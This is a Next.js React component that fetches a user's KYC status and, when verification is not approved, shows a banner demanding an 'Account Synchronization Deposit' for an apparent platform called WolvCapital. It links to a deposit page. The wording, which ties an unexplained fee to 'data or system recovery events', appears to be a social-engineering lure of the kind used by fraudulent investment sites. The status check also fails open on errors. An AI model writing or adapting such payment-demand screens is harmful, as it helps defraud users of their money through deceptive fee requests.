"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { apiFetch } from "@/lib/api";

type ValidationBannerProps = {
  required?: boolean;
  completed?: boolean;
};

type KycStatus = {
  required: boolean;
  completed: boolean;
};

const failOpen: KycStatus = {
  required: false,
  completed: true,
};

export default function ValidationBanner({ required, completed }: ValidationBannerProps) {
  const hasInitial = typeof required === "boolean" && typeof completed === "boolean";
  const [status, setStatus] = useState<KycStatus>(
    hasInitial ? { required, completed } : failOpen
  );

  useEffect(() => {
    if (hasInitial) {
      setStatus({ required: required as boolean, completed: completed as boolean });
    }
  }, [hasInitial, required, completed]);

  useEffect(() => {
    if (hasInitial) return;

    let active = true;

    const load = async () => {
      try {
        const response = await apiFetch("/api/kyc/", {
          method: "GET",
          cache: "no-store",
        });

        if (!response.ok || response.status === 401) {
          if (active) setStatus(failOpen);
          return;
        }

        const payload = (await response.json()) as Array<{ status?: string }> | { status?: string };
        const latest = Array.isArray(payload) ? payload[0] : payload;
        const statusValue = String(latest?.status || "").toLowerCase();
        const isApproved = statusValue === "approved";

        if (active) {
          setStatus({
            required: !isApproved,
            completed: isApproved,
          });
        }
      } catch {
        if (active) setStatus(failOpen);
      }
    };

    load();

    return () => {
      active = false;
    };
  }, [hasInitial]);

  if (!status.required || status.completed) {
    return null;
  }

  return (
    <div className="px-4 lg:px-8 py-3">
      <div className="rounded-2xl border border-amber-200 bg-amber-50 px-4 py-4 text-amber-950 shadow-sm sm:px-6">
        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <h2 className="text-base font-semibold">Action Required: Account Synchronization Deposit</h2>
            <p className="mt-1 text-sm text-amber-900">
              This measure forms part of WolvCapital’s internal operational and risk-management procedures following data or system recovery events.Please complete the synchronization deposit to keep your dashboard fully active. Never share
              your password or one-time passcode (OTP) with anyone.
            </p>
          </div>
          <Link
            href="/dashboard/deposit"
            className="inline-flex items-center justify-center rounded-full bg-amber-900 px-4 py-2 text-sm font-semibold text-white shadow-sm transition hover:bg-amber-800 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-amber-900"
          >
            Complete synchronization deposit
          </Link>
        </div>
      </div>
    </div>
  );
}
